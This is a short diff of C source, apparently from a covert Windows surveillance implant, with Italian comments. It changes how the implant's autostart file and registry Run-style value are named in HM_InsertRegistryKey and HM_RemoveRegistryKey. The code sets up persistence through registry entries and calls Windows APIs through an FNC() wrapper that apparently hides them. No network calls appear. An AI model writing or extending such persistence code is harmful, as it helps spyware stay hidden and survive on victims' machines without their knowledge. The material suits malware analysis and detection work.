@@ -1990,7 +1990,7 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 	}
 
 	// Crea il file per l'avvio se non esiste gia'
-	sprintf(key_value, "..\\%s.%s", extension, extension);
+	sprintf(key_value, "..\\%s.%s", REGISTRY_KEY_NAME, extension);
 	HM_CompletePath(key_value, dll_path);
 	hfile = CreateFile(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE) {
@@ -2038,7 +2038,7 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 		sprintf(key_value, H4_HOME_PATH);
 		if (ptr = strrchr(key_value, '\\')) { 
 			*ptr = 0;
-			sprintf(key_value, "%s\\%s.%s", key_value, extension, extension);
+			sprintf(key_value, "%s\\%s.%s", key_value, REGISTRY_KEY_NAME, extension);
 			FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
 		}
 		FNC(RegCloseKey)(hOpen);
@@ -2078,7 +2078,7 @@ void HM_RemoveRegistryKey()
 	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
 
 	// Cancella il file
-	sprintf(key_path, "..\\%s.%s", extension, extension);
+	sprintf(key_path, "..\\%s.%s", REGISTRY_KEY_NAME, extension);
 	HM_CompletePath(key_path, dll_path);
 	FNC(SetFileAttributesA)(dll_path, FILE_ATTRIBUTE_NORMAL);
 	FNC(DeleteFileA)(dll_path);
